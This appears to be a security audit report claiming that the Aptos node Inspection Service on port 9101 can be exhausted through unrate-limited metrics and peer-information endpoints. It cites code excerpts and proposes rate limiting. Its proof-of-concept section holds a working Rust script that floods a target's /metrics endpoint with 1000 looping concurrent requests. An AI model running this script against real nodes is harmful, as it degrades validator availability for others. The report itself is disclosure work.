# Audit Report

## Title
Inspection Service DoS via Unrate-Limited Resource-Intensive Endpoints

## Summary
The Aptos Inspection Service exposes multiple resource-intensive HTTP endpoints without any rate limiting, connection limits, or authentication. An attacker can send unlimited concurrent requests to endpoints like `/metrics`, `/json_metrics`, and `/peer_information`, causing CPU and memory exhaustion that degrades validator node performance and potentially impacts consensus participation. [1](#0-0) 

## Finding Description

The inspection service starts a Hyper HTTP server with minimal configuration and no rate limiting protections. [2](#0-1) 

The service exposes several resource-intensive endpoints:

1. **Metrics Endpoints** (`/metrics`, `/json_metrics`, `/forge_metrics`): Each request triggers a full metrics collection via `aptos_metrics_core::gather()`, which iterates through all registered metrics. The code itself acknowledges this overhead by tracking metric families exceeding 2000 dimensions. [3](#0-2) 

2. **Peer Information Endpoint** (`/peer_information`): This endpoint performs expensive operations including iterating over all peers, fetching metadata for each peer, sorting operations, and building extensive formatted output. [4](#0-3) 

3. **Configuration Endpoint** (`/configuration`): Serializes the entire NodeConfig structure using debug formatting. [5](#0-4) 

The service binds to `0.0.0.0:9101` by default with no authentication. [6](#0-5) 

**Attack Scenario:**
1. Attacker identifies accessible inspection service on port 9101
2. Attacker sends rapid concurrent HTTP requests to `/metrics` or `/peer_information`
3. Each request triggers expensive operations (metrics gathering, peer enumeration)
4. Node's CPU and memory resources become saturated
5. Validator performance degrades, potentially missing consensus rounds
6. Network availability and stability are impacted

While Kubernetes deployments may have NetworkPolicy protection, this only restricts access to HAProxy, monitoring, and health-checker pods. [7](#0-6)  Non-Kubernetes deployments or misconfigured clusters remain fully vulnerable.

## Impact Explanation

This vulnerability qualifies as **High Severity** under Aptos bug bounty criteria due to "Validator node slowdowns." The resource exhaustion directly impacts validator node performance through:

- **CPU Exhaustion**: Continuous metrics gathering and peer enumeration consume CPU cycles needed for consensus operations
- **Memory Pressure**: Concurrent request handling and large response generation increase memory usage
- **Consensus Impact**: Performance degradation can cause validators to miss consensus rounds, affecting network liveness
- **Cascading Effects**: If multiple validators are targeted simultaneously, network-wide performance degradation occurs

This breaks the critical invariant: "Resource Limits: All operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires minimal sophistication:
- No authentication or authorization required
- Simple HTTP GET requests with standard tools (curl, scripts)
- Service exposed on all interfaces by default
- No complexity in exploitation

Factors increasing likelihood:
- Default configuration exposes service on `0.0.0.0:9101`
- Non-Kubernetes deployments have no network-level protection
- Even in Kubernetes, monitoring pods from any namespace can access the service
- Public fullnodes and improperly firewalled validators are vulnerable
- Attack can be automated and distributed

## Recommendation

Implement multi-layered DoS protection:

1. **Add Rate Limiting**: Implement per-IP request rate limiting using a middleware layer (e.g., tower-governor or custom token bucket implementation)

2. **Add Connection Limits**: Configure Hyper server with maximum concurrent connection limits

3. **Add Authentication**: Require bearer token or IP whitelist for sensitive endpoints

4. **Add Request Throttling**: Implement adaptive throttling based on server load

5. **Improve Network Isolation**: 
   - Default to binding on `127.0.0.1` instead of `0.0.0.0`
   - Document firewall requirements prominently
   - Strengthen NetworkPolicy to specific monitoring namespace

Example implementation:
```rust
// Add to server configuration
use tower::ServiceBuilder;
use tower_governor::{GovernorLayer, GovernorConfigBuilder};

// Configure rate limiter
let governor_conf = Box::new(
    GovernorConfigBuilder::default()
        .per_second(10) // 10 requests per second
        .burst_size(20) // Allow burst of 20
        .finish()
        .unwrap()
);

// Wrap service with rate limiting
let make_service = make_service_fn(move |_conn| {
    let service = service_fn(/* existing handler */);
    ServiceBuilder::new()
        .layer(GovernorLayer { config: governor_conf.clone() })
        .service(service)
});
```

## Proof of Concept

```rust
// DoS attack simulation
// Compile: cargo build --release
// Run: ./dos_inspection_service <target_ip>

use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() {
    let target = std::env::args().nth(1).expect("Usage: dos_inspection_service <target_ip>");
    let url = format!("http://{}:9101/metrics", target);
    
    println!("[*] Starting DoS attack on {}", url);
    println!("[*] Sending 1000 concurrent requests...");
    
    let mut handles = vec![];
    
    // Launch 1000 concurrent requests
    for i in 0..1000 {
        let url = url.clone();
        let handle = tokio::spawn(async move {
            loop {
                match reqwest::get(&url).await {
                    Ok(resp) => {
                        println!("[{}] Request succeeded: {} bytes", i, 
                                resp.content_length().unwrap_or(0));
                    }
                    Err(e) => {
                        println!("[{}] Request failed: {}", i, e);
                    }
                }
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        });
        handles.push(handle);
    }
    
    // Run for 60 seconds
    tokio::time::sleep(Duration::from_secs(60)).await;
    println!("[*] Attack completed. Check target node CPU/memory usage.");
}
```

**Expected Outcome**: Target validator node experiences elevated CPU usage (>80%), increased memory consumption, and potential consensus performance degradation observable through missed rounds or increased block time.

## Notes

This vulnerability is particularly concerning because:
- It affects the stability of validator nodes critical to network consensus
- The inspection service is enabled by default on all nodes
- The attack requires no special privileges or insider access
- It can be executed remotely from any network location with access to port 9101
- Multiple validators can be targeted simultaneously for maximum network impact

The issue is not a generic network-level DoS (which is out of scope), but rather an application-level resource exhaustion vulnerability due to missing security controls on expensive operations.

### Citations

**File:** crates/aptos-inspection-service/src/server/mod.rs (L50-101)
```rust
pub fn start_inspection_service(
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) {
    // Fetch the service port and address
    let service_port = node_config.inspection_service.port;
    let service_address = node_config.inspection_service.address.clone();

    // Create the inspection service socket address
    let address: SocketAddr = (service_address.as_str(), service_port)
        .to_socket_addrs()
        .unwrap_or_else(|_| {
            panic!(
                "Failed to parse {}:{} as address",
                service_address, service_port
            )
        })
        .next()
        .unwrap();

    // Create a runtime for the inspection service
    let runtime = aptos_runtimes::spawn_named_runtime("inspection".into(), None);

    // Spawn the inspection service
    thread::spawn(move || {
        // Create the service function that handles the endpoint requests
        let make_service = make_service_fn(move |_conn| {
            let node_config = node_config.clone();
            let aptos_data_client = aptos_data_client.clone();
            let peers_and_metadata = peers_and_metadata.clone();
            async move {
                Ok::<_, Infallible>(service_fn(move |request| {
                    serve_requests(
                        request,
                        node_config.clone(),
                        aptos_data_client.clone(),
                        peers_and_metadata.clone(),
                    )
                }))
            }
        });

        // Start and block on the server
        runtime
            .block_on(async {
                let server = Server::bind(&address).serve(make_service);
                server.await
            })
            .unwrap();
    });
}
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L49-79)
```rust
/// A simple utility function that returns all metric families
fn get_metric_families() -> Vec<MetricFamily> {
    let metric_families = aptos_metrics_core::gather();
    let mut total: u64 = 0;
    let mut families_over_2000: u64 = 0;

    // Take metrics of metric gathering so we know possible overhead of this process
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
    }

    // These metrics will be reported on the next pull, rather than create a new family
    NUM_METRICS.with_label_values(&["total"]).inc_by(total);
    NUM_METRICS
        .with_label_values(&["families_over_2000"])
        .inc_by(families_over_2000);

    metric_families
}
```

**File:** crates/aptos-inspection-service/src/server/peer_information.rs (L40-106)
```rust
/// Returns a simple text formatted string with peer and network information
fn get_peer_information(
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> String {
    // Get all registered networks
    let registered_networks: Vec<NetworkId> =
        peers_and_metadata.get_registered_networks().collect();

    // Get all peers (sorted by peer ID)
    let mut all_peers = peers_and_metadata.get_all_peers();
    all_peers.sort();

    // Display a summary of all peers and networks
    let mut peer_information_output = Vec::<String>::new();
    display_peer_information_summary(
        &mut peer_information_output,
        &all_peers,
        &registered_networks,
    );
    peer_information_output.push("\n".into());

    // Display connection metadata for each peer
    display_peer_connection_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display the entire set of trusted peers
    display_trusted_peers(
        &mut peer_information_output,
        registered_networks,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display basic peer metadata for each peer
    display_peer_monitoring_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display state sync metadata for each peer
    display_state_sync_metadata(&mut peer_information_output, &all_peers, aptos_data_client);
    peer_information_output.push("\n".into());

    // Display detailed peer metadata for each peer
    display_detailed_monitoring_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display the internal client state for each peer
    display_internal_client_state(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );

    peer_information_output.join("\n") // Separate each entry with a newline to construct the output
}
```

**File:** crates/aptos-inspection-service/src/server/configuration.rs (L13-29)
```rust
pub fn handle_configuration_request(node_config: &NodeConfig) -> (StatusCode, Body, String) {
    // Only return configuration if the endpoint is enabled
    let (status_code, body) = if node_config.inspection_service.expose_configuration {
        // We format the configuration using debug formatting. This is important to
        // prevent secret/private keys from being serialized and leaked (i.e.,
        // all secret keys are marked with SilentDisplay and SilentDebug).
        let encoded_configuration = format!("{:?}", node_config);
        (StatusCode::OK, Body::from(encoded_configuration))
    } else {
        (
            StatusCode::FORBIDDEN,
            Body::from(CONFIGURATION_DISABLED_MESSAGE),
        )
    };

    (status_code, body, CONTENT_TYPE_TEXT.into())
}
```

**File:** config/src/config/inspection_service_config.rs (L26-37)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
}
```

**File:** terraform/helm/aptos-node/templates/networkpolicy.yaml (L38-56)
```yaml
  # Monitoring metrics port
  - from:
    - namespaceSelector: {}
    - podSelector:
        matchLabels:
          app.kubernetes.io/name: monitoring
    ports:
    - protocol: TCP
      port: 9101
  # Node Health Checker accesses these ports
  - from:
    - namespaceSelector: {}
    - podSelector:
        matchLabels:
          app.kubernetes.io/name: node-health-checker
    ports:
    - protocol: TCP
      port: 9101
    - protocol: TCP
```
